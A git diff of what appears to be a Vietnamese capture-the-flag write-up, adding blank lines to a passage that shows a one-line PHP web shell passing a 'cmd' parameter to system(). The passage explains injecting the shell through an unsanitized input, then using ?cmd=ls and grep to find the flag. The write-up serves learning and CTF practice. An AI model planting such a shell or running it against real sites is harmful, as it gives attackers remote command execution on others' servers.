@@ -40,8 +40,10 @@ Thì tui đã sử dụng một command khá là phổ biến có sẵn trên m�
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 Command này được sử dụng khi một web không sử lý những thông tin được input, nếu biến "cmd" không được xử lý kỹ có thể dẫn tới việc chiếm shell web, từ đó có thể thực thi các lệnh trên trang web như là 1 shell. Có thể đọc ở đây: https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/<br />
+
 Gửi lệnh này tới server, sau đó nhận thông báo là tin nhắn được lưu ở một trang, truy cập trang web đó, ta có thể bắt đầu sử dụng các command với parameter ?cmd= command<br />
 Sử dụng lệnh ?cmd=ls ta có thể list ra tất cả các file thì có thể thấy có rất nhiều file php, và không có file flag hay flag.txt, nên có thể flag đã nằm một trong những file php.<br />
+
 Nếu xài lệnh cat để kiểm tra thì sẽ rất lâu cho từng file, nên sử dụng lệnh ?cmd=grep -r valentine.<br />
 Grep sẽ như một ctrl F, -r(recursively) sẽ là lệnh để tìm liên tục, kiểu như scan từng file một để tìm cho ta chuỗi "valentine". Sau đó nó sẽ in ra tên file chứa chuỗi đó + chuỗi đó.
 Và ta có flag.
